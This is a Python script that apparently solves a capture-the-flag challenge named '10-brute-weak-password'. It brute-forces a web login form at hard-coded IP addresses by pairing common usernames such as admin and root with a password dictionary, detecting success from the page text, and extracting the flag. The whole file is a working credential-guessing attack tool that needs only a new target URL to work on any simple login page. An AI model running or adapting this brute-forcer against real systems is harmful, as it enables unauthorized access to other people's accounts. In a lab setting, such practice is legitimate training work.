#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
P5TEGw

Usage:
  python3 solve_10_brute_weak_password.py
  python3 solve_10_brute_weak_password.py --url http://47.120.76.57:33855/ --password-file password1.txt
"""

import argparse
import os
import pathlib
import re
import sys
from typing import Iterable, Optional, Tuple

import requests

os.environ["NO_PROXY"] = "*"
DEFAULT_URL = "http://47.120.47.61:33239/"
DEFAULT_USERS = ["admin", "root", "test", "user", "ctf", "guest"]
FAIL_MARK = "用户名或密码错误"
FLAG_RE = re.compile(r"TOGOGO-flag\{[^}]+\}")


def load_passwords(path: pathlib.Path) -> list[str]:
    if not path.exists():
        raise FileNotFoundError(f"password file not found: {path}")
    return [line.strip() for line in path.read_text(encoding="utf-8", errors="ignore").splitlines() if line.strip()]


def try_login(session: requests.Session, url: str, username: str, password: str, timeout: float) -> Tuple[bool, str]:
    """Return (possible_success, response_text)."""
    r = session.post(
        url,
        data={"username": username, "password": password},
        timeout=timeout,
    )
    text = r.text
    # 失败时页面固定返回：用户名或密码错误！
    # 成功时本题直接返回 flag。
    if FAIL_MARK not in text:
        return True, text
    return False, text


def brute_force(url: str, users: Iterable[str], passwords: Iterable[str], timeout: float) -> Optional[Tuple[str, str, str]]:
    session = requests.Session()
    count = 0
    for username in users:
        for password in passwords:
            count += 1
            print(f"[*] try #{count}: {username}:{password}")
            ok, body = try_login(session, url, username, password, timeout)
            if ok:
                return username, password, body
    return None


def main() -> int:
    base_dir = pathlib.Path(__file__).resolve().parent

    parser = argparse.ArgumentParser(description="Solve 10-brute-weak-password by trying password1.txt against a simple login form.")
    parser.add_argument("--url", default=DEFAULT_URL, help=f"target URL, default: {DEFAULT_URL}")
    parser.add_argument("--password-file", default=str(base_dir / "password1.txt"), help="password dictionary path, default: ./password1.txt")
    parser.add_argument("--users", default=",".join(DEFAULT_USERS), help="comma-separated usernames to try")
    parser.add_argument("--timeout", type=float, default=8.0, help="request timeout seconds")
    args = parser.parse_args()

    password_file = pathlib.Path(args.password_file).expanduser()
    users = [u.strip() for u in args.users.split(",") if u.strip()]

    try:
        passwords = load_passwords(password_file)
    except Exception as exc:
        print(f"[!] {exc}", file=sys.stderr)
        return 2

    print(f"[*] url: {args.url}")
    print(f"[*] users: {users}")
    print(f"[*] password file: {password_file} ({len(passwords)} passwords)")

    result = brute_force(args.url, users, passwords, args.timeout)
    if not result:
        print("[-] Not found")
        return 1

    username, password, body = result
    print("\n[+] Found valid credential")
    print(f"[+] username = {username}")
    print(f"[+] password = {password}")

    flag_match = FLAG_RE.search(body)
    if flag_match:
        print(f"[+] flag = {flag_match.group(0)}")
    else:
        print("[!] No TOGOGO flag regex match, raw response below:")
        print(body)

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
